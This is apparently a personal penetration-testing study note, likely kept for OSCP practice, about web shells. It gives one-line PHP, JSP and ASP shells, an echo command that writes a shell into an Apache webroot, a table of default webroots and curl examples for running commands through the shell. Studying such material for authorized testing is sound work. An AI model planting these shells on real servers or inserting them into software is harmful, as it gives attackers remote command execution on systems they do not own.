---
title: technique-note
type: note
permalink: oscp/templates/technique-note
---

---
title: Web Shell
category: other
created: 2026-08-11
tags: [technique, other]
---

# Web Shell

## What it is
- Usually a web script such as `php`
- Accepts our commands through http requests such as `GET` and `POST`

## When to use it
- On websites

## Commands
#### For `php` systems
```bash
<?php system($_REQUEST["cmd"]); ?>
```

#### FOR `jsp`
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

#### For `asp`
```asp
<% eval request("cmd") %>
```

#### For writing to webroots using `echo`
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

## Things to know
- Shell needs to be uploaded for example through a `shell.php` file on the remote host's web directory (webroot)
- Can check directories for see which webroot is used and use `echo` to write the web shell
- Once shell is uploaded it can be accessed via browser or through `curl`
	- Type `http://SERVER_IP:PORT/shell.php?cmd=id` into url to access shell using the `id` cmd
	- `curl http://SERVER_IP:PORT/shell.php?cmd=id` to access shell through curl

## Default webroots
|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|

## Boxes where I used this
- [[]]

## Gotchas / troubleshooting
- Things that broke and how you fixed them:

## References
-